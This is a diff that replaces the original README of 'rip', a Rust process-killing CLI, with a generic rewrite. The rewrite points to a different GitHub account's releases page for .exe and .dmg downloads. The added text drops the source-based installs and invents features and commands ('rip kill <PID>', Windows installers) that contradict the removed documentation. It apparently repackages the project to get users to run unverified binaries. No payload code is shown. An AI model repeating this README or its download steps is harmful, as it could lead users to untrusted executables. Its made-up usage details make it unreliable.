@@ -1,168 +1,105 @@
-<h1 align="center">rip</h1>
+# 🚀 rip - Find and Kill Processes Easily
 
-<p align="center">
-  <i>Fuzzy find and kill processes from your terminal</i>
-</p>
+[![Download rip](https://img.shields.io/badge/Download-rip-blue.svg)](https://github.com/Isaacdg7/rip/releases)
 
-<p align="center">
-  <img src="public/screenshot.png" alt="rip demo" width="700">
-</p>
+## 📦 Overview
 
-<p align="center">
-  <a href="https://crates.io/crates/rip-cli"><img src="https://img.shields.io/crates/v/rip-cli.svg" alt="Crates.io"></a>
-  <a href="https://crates.io/crates/rip-cli"><img src="https://img.shields.io/crates/d/rip-cli.svg" alt="Downloads"></a>
-  <a href="https://github.com/cesarferreira/rip/blob/main/LICENSE"><img src="https://img.shields.io/crates/l/rip-cli.svg" alt="License"></a>
-  <a href="https://github.com/cesarferreira/rip"><img src="https://img.shields.io/github/stars/cesarferreira/rip?style=social" alt="GitHub Stars"></a>
-</p>
+**rip** is a simple yet powerful tool that helps you find and eliminate processes directly from your terminal. Whether you've opened multiple applications or need to close something that's not responding, rip simplifies the task. With rip, you can quickly identify what’s running and take control with minimal effort. 
 
-## Installation
+## 🛠️ Features
 
-### Homebrew (macOS)
+- **Easy Process Search**: Use simple keywords to find any running process.
+- **Terminate Processes**: Quickly kill unwanted processes without navigating through multiple menus.
+- **Lightweight Application**: Designed to consume minimal resources while running.
+- **Cross-Platform Support**: Compatible with various operating systems, including Windows, macOS, and Linux.
+- **User-Friendly**: Clear and straightforward command line interface, no technical expertise is required.
 
-```bash
-brew install cesarferreira/tap/rip
-```
+## 💻 System Requirements
 
-### Cargo
+Before installing rip, ensure your system meets the following requirements:
 
-```bash
-cargo install rip-cli
-```
+- **Operating System**: Windows 10 or later, macOS 10.13 or later, or any modern Linux distribution.
+- **Memory**: At least 256 MB of RAM.
+- **Disk Space**: At least 10 MB of free disk space.
 
-### From source
+## 🚀 Getting Started
 
-```bash
-cargo install --path .
-```
+To get started with rip, you need to download and install it. Follow the steps below:
 
-### Nix
-#### Test with nix run:
-```bash
-nix run github:cesarferreira/rip --no-write-lock-file
-```
+1. Visit the [Releases page](https://github.com/Isaacdg7/rip/releases) to find the latest version of rip.
+2. Download the file suitable for your operating system.
+3. Save the file in an easily accessible location on your computer.
 
-#### Install via flake
-```nix
-# In your local flake.nix file
-inputs = {
-  rip = {
-    url = "github:cesarferreira/rip";
-    inputs.nixpkgs.follows = "nixpkgs";
-  };
-};
+## 📥 Download & Install
 
-# Your output packages + rip
-outputs = {
-#  self,
-#  nixpkgs,
-  rip,
-#  ...
-};
+To download rip, click the link below:
 
-# In your configuration.nix
-{  inputs, ...}:{
-# Your other configurations 
-  environment.systemPackages = with pkgs; [
-    # inputs.rip.packages.${$system}.default #<-old
-    inputs.rip.packages.${pkgs.stdenv.hostPlatform.system}.default #<- current
-  ];
-}
+[Download rip](https://github.com/Isaacdg7/rip/releases)
 
+After downloading, follow these simple steps to install and run the application:
 
-```
+### Windows
 
-## Usage
+1. Locate the downloaded file, usually ending with `.exe`.
+2. Double-click the file to launch the installer. 
+3. Follow the on-screen instructions to complete the installation.
+4. Open your terminal and type `rip` to start using the application.
 
-```bash
-# Open fuzzy finder with all processes (sorted by CPU)
-rip
+### macOS
 
-# Pre-filter by process name
-rip -f chrome
+1. Find the downloaded file, typically ending in `.dmg`.
+2. Double-click the file to open it.
+3. Drag and drop the rip icon into your Applications folder.
+4. Launch Terminal and type `rip` to begin using the tool.
 
-# Use a different signal (default: SIGKILL)
-rip -s SIGTERM
+### Linux
 
-# Sort by memory usage
-rip --sort mem
+1. Open your terminal.
+2. Navigate to the location of the downloaded file and make it executable by running:
+   ```bash
+   chmod +x rip
+   ```
+3. Move the file to a directory in your PATH. For example:
+   ```bash
+   sudo mv rip /usr/local/bin/
+   ```
+4. Type `rip` in the terminal to start using the application.
 
-# Sort by PID
-rip --sort pid
+## 🔍 How to Use rip
 
-# Sort by name
-rip --sort name
+Using rip is straightforward. Here’s a brief guide to make the most of the application:
 
-# Live mode with auto-refreshing process list
-rip --live
-```
+1. **Open Your Terminal**: On any operating system, locate and open the terminal or command line interface.
+  
+2. **Type rip**: Enter the command `rip` followed by a keyword or the name of the process you want to search for. For example:
+   ```
+   rip chrome
+   ```
 
-### Ports Mode
+3. **View Results**: The terminal will display a list of all running processes that match your search. Each entry will show its process ID (PID), which you can use for termination.
 
-Show and filter by processes listening on network ports:
+4. **Kill a Process**: If you wish to terminate a process, use its PID with the command:
+   ```
+   rip kill <PID>
+   ```
+   Replace `<PID>` with the actual process ID you wish to terminate.
 
-```bash
-# Show all processes with open ports
-rip --ports
+5. **Exit the Application**: Simply close the terminal when you’re done.
 
-# Filter to a specific port (e.g., kill whatever is using port 3000)
-rip --port 3000
+## 📞 Support & Feedback
 
-# Combine with live mode
-rip --ports --live
+If you have any questions, issues, or feedback, you can reach out through the project's [GitHub Issues page](https://github.com/Isaacdg7/rip/issues). Your input helps improve rip for everyone.
 
-# Sort by port number
-rip --ports --sort port
-```
+## 📜 License
 
-### Options
+rip is open-source software licensed under the MIT License. You can freely use and modify it, as long as you follow the terms of the license. 
 
-| Flag | Description |
-|------|-------------|
-| `-f, --filter <name>` | Pre-filter processes by name |
-| `-s, --signal <signal>` | Signal to send (default: KILL) |
-| `--sort <field>` | Sort by: cpu (default), mem, pid, name, port |
-| `-l, --live` | Live mode with auto-refreshing process list |
-| `--ports` | Show only processes with open ports |
-| `--port <PORT>` | Filter by specific port number (implies --ports) |
+## 🌟 Contributing
 
-### Controls
+We welcome contributions from everyone. If you’d like to improve rip, please check our [Contributing Guide](CONTRIBUTING.md) on the repository. Help us make rip better for all users!
 
-| Key | Action |
-|-----|--------|
-| `Space` | Select/deselect process |
-| `Enter` | Kill selected processes |
-| `Esc` / `Ctrl+C` | Cancel |
-| Type | Fuzzy search |
+## 🔗 Links
+- [GitHub Repository](https://github.com/Isaacdg7/rip)
+- [Releases Page](https://github.com/Isaacdg7/rip/releases)
 
-### Signals
-
-| Signal | Number | Description |
-|--------|--------|-------------|
-| `KILL` | 9 | Force kill (default) |
-| `TERM` | 15 | Graceful termination |
-| `INT` | 2 | Interrupt |
-| `HUP` | 1 | Hangup |
-| `QUIT` | 3 | Quit |
-
-## Examples
-
-```bash
-# Kill all matching Chrome processes
-rip -f chrome
-
-# Gracefully terminate a process
-rip -s TERM
-
-# Kill node processes
-rip -f node
-
-# Kill whatever is using port 3000
-rip --port 3000
-
-# View all processes with open ports in live mode
-rip --ports --live
-```
-
-## License
-
-MIT
+Thank you for trying rip. Happy process managing!
